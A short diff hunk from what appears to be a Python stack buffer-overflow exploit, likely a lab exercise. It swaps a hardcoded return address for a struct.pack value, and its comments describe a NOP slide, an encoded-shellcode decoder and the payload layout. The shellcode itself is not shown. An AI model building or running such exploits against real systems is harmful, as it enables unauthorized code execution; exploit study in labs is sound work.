@@ -116,7 +116,7 @@ def get_payload():
     new_nop = '\x4e' # this is the instruction 'dec esi'. we replace our nop with this
     shellcode = get_shellcode()
     shellcode_length = len(shellcode)
-    address_to_return = "\x20\xde\xff\xbf" # this is the address in the middle of the NOPs slide
+    address_to_return = struct.pack('<I', 0xbfffddc3) # this is the address in the middle of the NOPs slide
     # this time our nops slide is short only ~200 bytes so we will jump 100 bytes after the begining of the buffer
 
     # full structe - slide NOPs, init eax with encoded shellcode address, decoder, shellcode, address to return
